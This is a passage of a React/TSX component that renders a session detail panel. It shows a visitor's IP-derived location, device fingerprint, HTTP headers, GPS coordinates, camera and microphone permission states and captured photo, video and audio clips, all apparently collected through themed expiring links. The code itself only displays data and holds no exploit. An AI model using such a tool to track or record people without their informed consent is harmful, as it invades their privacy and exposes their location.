                  <FileText size={13} /> Message
                </button>
                <button onClick={() => onExportCsv(session.demoId)} className="btn btn-outline" style={{ fontSize: '0.8rem', padding: '0.4rem 0.75rem' }}>
                  <Download size={13} /> CSV
                </button>
                <button onClick={() => onTerminate(session.demoId)} className="btn btn-danger" style={{ fontSize: '0.8rem', padding: '0.4rem 0.75rem' }}>
                  <Trash2 size={13} /> Terminate
                </button>
              </>
            )}
            <button onClick={onClose} className="btn btn-ghost" style={{ padding: '0.375rem' }}>
              <XCircle size={18} />
            </button>
          </div>
        </div>

        <div className="p-6 space-y-4 overflow-y-auto" style={{ maxHeight: 'calc(90vh - 80px)' }}>
          {/* Overview */}
          <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
            <div className="info-section">
              <div className="info-section-title"><Activity size={13} /> Overview</div>
              <InfoRow label="URL ID" value={<span className="info-value-mono">{session.demoId}</span>} />
              <InfoRow label="Status" value={<span className={`badge badge-${session.status}`}>{session.status}</span>} />
              <InfoRow label="Theme" value={`${session.themeEmoji || ''} ${session.themeLabel || '—'}`} />
              <InfoRow label="Content" value={<span style={{ textTransform: 'capitalize' }}>{session.mediaType}</span>} />
              <InfoRow label="Visits" value={<strong>{session.visitCount}</strong>} />
              <InfoRow label="First Visit" value={session.visitedAt ? formatDate(session.visitedAt) : 'Not yet'} />
              <InfoRow label="Last Visit" value={session.lastVisitAt ? formatDate(session.lastVisitAt) : '—'} />
              <InfoRow label="Created" value={formatDate(session.createdAt)} />
              <InfoRow label="Expires" value={formatDate(session.expiresAt)} />
            </div>

            <div className="info-section">
              <div className="info-section-title"><Globe size={13} /> IP-derived approximate location</div>
              {g ? (
                <>
                  <InfoRow label="Status" value={<span className={`badge badge-${g.status}`}>{g.status}</span>} />
                  <InfoRow label="IP" value={<span className="info-value-mono">{g.ip}</span>} />
                  <InfoRow label="Country" value={`${g.country || '—'} ${g.countryCode ? `(${g.countryCode})` : ''}`} />
                  <InfoRow label="Region" value={g.region || '—'} />
                  <InfoRow label="City" value={g.city || '—'} />
                  <InfoRow label="Postal Code" value={g.postalCode || '—'} />
                  <InfoRow label="Coordinates" value={g.latitude !== null && g.longitude !== null ? `${g.latitude.toFixed(4)}, ${g.longitude.toFixed(4)}` : '—'} />
                  <InfoRow label="Timezone" value={g.timezone || '—'} />
                  <InfoRow label="ISP" value={g.isp || '—'} />
                  <InfoRow label="Org" value={g.org || '—'} />
                  <InfoRow label="ASN" value={g.asn || '—'} />
                  <InfoRow label="Provider" value={g.provider || '—'} />
                  <InfoRow label="Note" value={g.note || '—'} />
                </>
              ) : (
                <div className="text-xs" style={{ color: 'var(--color-text-muted)', padding: '0.5rem 0' }}>
                  {session.visitCount > 0 ? 'Geo lookup unavailable' : 'No visits yet'}
                </div>
              )}
            </div>
          </div>

          {/* Network + Browser */}
          <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
            <div className="info-section">
              <div className="info-section-title"><Monitor size={13} /> Browser</div>
              {n ? (
                <>
                  <InfoRow label="Browser" value={`${n.browser} ${n.browserVersion}`} />
                  <InfoRow label="OS" value={`${n.os} ${n.osVersion}`} />
                  <InfoRow label="Platform" value={n.platform || '—'} />
                  <InfoRow label="Device" value={n.deviceCategory} />
                  <InfoRow label="IP" value={<span className="info-value-mono">{n.ipAddress}</span>} />
                  <InfoRow label="Referrer" value={n.referrer || '—'} />
                  <InfoRow label="User-Agent" value={<span className="info-value-mono text-xs break-all">{n.userAgent}</span>} />
                </>
              ) : (
                <div className="text-xs" style={{ color: 'var(--color-text-muted)', padding: '0.5rem 0' }}>No visits yet</div>
              )}
            </div>

            <div className="info-section">
              <div className="info-section-title"><Cpu size={13} /> Client Environment</div>
              {b ? (
                <>
                  <InfoRow label="Screen" value={`${b.screenWidth}×${b.screenHeight}`} />
                  <InfoRow label="Avail Screen" value={`${b.availScreenWidth}×${b.availScreenHeight}`} />
                  <InfoRow label="Viewport" value={`${b.viewportWidth}×${b.viewportHeight}`} />
                  <InfoRow label="DPR" value={b.devicePixelRatio} />
                  <InfoRow label="Color Depth" value={`${b.colorDepth}-bit`} />
                  <InfoRow label="Language" value={b.language} />
                  <InfoRow label="Languages" value={Array.isArray(b.languages) ? b.languages.join(', ') : b.language} />
                  <InfoRow label="Timezone" value={b.timezone} />
                  <InfoRow label="Touch" value={b.touchSupport ? 'Yes' : 'No'} />
                  <InfoRow label="Cookies" value={b.cookiesEnabled ? 'Enabled' : 'Disabled'} />
                  <InfoRow label="Do Not Track" value={b.doNotTrack === true ? 'Yes' : b.doNotTrack === false ? 'No' : 'Unset'} />
                  {b.connectionType && <InfoRow label="Connection" value={b.connectionType} />}
                </>
              ) : (
                <div className="text-xs" style={{ color: 'var(--color-text-muted)', padding: '0.5rem 0' }}>No visits yet</div>
              )}
            </div>
          </div>

          {/* HTTP Headers */}
          {n && (
            <div className="info-section">
              <div className="info-section-title"><Link2 size={13} /> HTTP Headers</div>
              <div className="grid grid-cols-1 md:grid-cols-2 gap-x-4">
                <InfoRow label="Accept-Language" value={n.acceptLanguage || '—'} />
                <InfoRow label="Accept-Encoding" value={n.acceptEncoding || '—'} />
                <InfoRow label="Sec-Fetch-Site" value={n.secFetchSite || '—'} />
                <InfoRow label="Sec-Fetch-Mode" value={n.secFetchMode || '—'} />
                <InfoRow label="Sec-Fetch-Dest" value={n.secFetchDest || '—'} />
                <InfoRow label="UA Client Hint" value={n.uaClientHint || '—'} />
                <InfoRow label="Origin" value={n.origin || '—'} />
              </div>
            </div>
          )}

          {/* GPS Location */}
          <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
            <div className="info-section">
              <div className="info-section-title"><MapPin size={13} /> Browser GPS</div>
              {l ? (
                <>
                  <InfoRow label="Latitude" value={l.latitude.toFixed(6)} />
                  <InfoRow label="Longitude" value={l.longitude.toFixed(6)} />
                  <InfoRow label="Accuracy" value={`${l.accuracy}m`} />
                  {l.altitude !== null && l.altitude !== undefined && <InfoRow label="Altitude" value={`${l.altitude}m`} />}
                  {l.altitudeAccuracy !== null && l.altitudeAccuracy !== undefined && <InfoRow label="Altitude Accuracy" value={`${l.altitudeAccuracy}m`} />}
                  {l.heading !== null && l.heading !== undefined && <InfoRow label="Heading" value={`${l.heading}°`} />}
                  {l.speed !== null && l.speed !== undefined && <InfoRow label="Speed" value={`${l.speed}m/s`} />}
                  <InfoRow label="Timestamp" value={l.timestamp ? formatDate(l.timestamp) : '—'} />
                </>
              ) : (
                <div className="text-xs" style={{ color: 'var(--color-text-muted)', padding: '0.5rem 0' }}>
                  <span className={`badge badge-${session.locationPermission}`}>{session.locationPermission.replace('_', ' ')}</span>
                </div>
              )}
            </div>

            <div className="info-section">
              <div className="info-section-title"><Shield size={13} /> Permissions</div>
              <InfoRow label="Camera" value={<span className={`badge badge-${session.cameraPermission}`}>{session.cameraPermission.replace('_', ' ')}</span>} />
              <InfoRow label="Microphone" value={<span className={`badge badge-${session.microphonePermission}`}>{session.microphonePermission.replace('_', ' ')}</span>} />
              <InfoRow label="Location" value={<span className={`badge badge-${session.locationPermission}`}>{session.locationPermission.replace('_', ' ')}</span>} />
            </div>
          </div>

          {/* Captured Media */}
          {(photoUrl || videoUrl || audioUrl) && (
            <div className="info-section">
              <div className="info-section-title"><Camera size={13} /> Captured Media</div>
              <div className="grid grid-cols-1 md:grid-cols-3 gap-3 mt-2">
                {photoUrl && (
                  <div>
                    <div className="text-xs mb-1" style={{ color: 'var(--color-text-muted)' }}>Photo</div>
                    <img src={photoUrl} alt="Captured photo" className="w-full rounded-lg" style={{ maxHeight: '160px', objectFit: 'cover' }} />
                  </div>
                )}
                {videoUrl && (
                  <div>
                    <div className="text-xs mb-1" style={{ color: 'var(--color-text-muted)' }}>Video (5s)</div>
                    <video src={videoUrl} controls className="w-full rounded-lg" style={{ maxHeight: '160px' }} />
                  </div>
                )}
                {audioUrl && (
                  <div>
                    <div className="text-xs mb-1" style={{ color: 'var(--color-text-muted)' }}>Audio (5s)</div>
                    <audio src={audioUrl} controls className="w-full" />
                  </div>
                )}
              </div>
            </div>
          )}
        </div>
      </div>
    </div>
  );
}

// ─── Info Row Helper ──────────────────────────────────────────────────────────
function InfoRow({ label, value }: { label: string; value: React.ReactNode }) {
  return (
    <div className="info-row">
      <span className="info-label">{label}</span>
      <span className="info-value">{value}</span>
    </div>
  );
}
